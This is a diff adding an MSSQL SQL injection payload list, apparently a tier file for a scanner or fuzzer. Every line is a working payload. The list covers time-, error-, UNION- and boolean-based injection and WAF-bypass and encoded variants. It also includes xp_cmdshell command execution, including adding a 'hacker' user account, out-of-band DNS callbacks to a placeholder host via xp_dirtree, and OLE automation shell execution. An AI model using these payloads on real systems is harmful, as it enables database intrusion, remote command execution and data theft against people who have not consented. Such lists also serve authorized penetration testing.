@@ -1,0 +1,51 @@
+# MSSQL SQLi — Advanced payload tier
+# ── Confirm ─────────────────────────────────────────────────────────────────
+'; WAITFOR DELAY '0:0:5'--
+' AND 1=CONVERT(INT,@@VERSION)--
+# ── Advanced — time-based ──────────────────────────────────────────────────
+'; IF 1=1 WAITFOR DELAY '0:0:5'--
+'; IF 1=2 WAITFOR DELAY '0:0:5'--
+'; DECLARE @q NVARCHAR(4000);SET @q=N'WAITFOR DELAY ''0:0:5''';EXEC(@q)--
+# ── Advanced — error-based ─────────────────────────────────────────────────
+' AND 1=CONVERT(INT,DB_NAME())--
+' AND 1=CONVERT(INT,USER_NAME())--
+' AND 1=CONVERT(INT,SYSTEM_USER)--
+# ── Advanced — UNION-based ─────────────────────────────────────────────────
+' UNION SELECT null,@@version,null--
+' UNION SELECT null,DB_NAME(),null--
+' UNION SELECT null,SYSTEM_USER,null--
+' UNION SELECT null,host_name(),null--
+' UNION SELECT null,name,null FROM sys.databases--
+' UNION SELECT null,name,null FROM sys.tables--
+# ── Advanced — boolean-based ───────────────────────────────────────────────
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 'x'='x
+admin'--
+# ── Advanced — stacked queries ─────────────────────────────────────────────
+'; SELECT TOP 1 name FROM sys.tables--
+' OR SUBSTRING(@@version,1,1)='M'--
+# ── Advanced — WAF bypass ──────────────────────────────────────────────────
+/**/OR/**/1=1--
+' ORDER BY 1--
+' ORDER BY 100--
+# ── URL-encoded variants ───────────────────────────────────────────────────
+%27%3b+WAITFOR+DELAY+%270%3a0%3a5%27--
+%27+AND+1%3dCONVERT(INT%2c@@VERSION)--
+%2527%3b+WAITFOR+DELAY+%270%3a0%3a5%27--
+# Mixed case
+'; WaItFoR dElAy '0:0:5'--
+' aNd 1=CoNvErT(iNt,@@VERSION)--
+# xp_cmdshell RCE
+'; EXEC xp_cmdshell 'whoami'--
+'; EXEC xp_cmdshell 'net user hacker P@ssw0rd /add'--
+'; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--
+# OOB DNS via xp_dirtree
+'; exec master..xp_dirtree '//INTERACTSH_URL/a'--
+'; exec master..xp_fileexist '//INTERACTSH_URL/a'--
+# sp_oacreate
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'ole automation procedures',1;RECONFIGURE--
+'; DECLARE @sh INT;EXEC sp_oacreate 'wscript.shell',@sh OUTPUT;EXEC sp_oamethod @sh,'run',NULL,'whoami'--
+# Hex bypass
+'; EXEC(0x57414954464F522044454C41592027303A303A352700)--
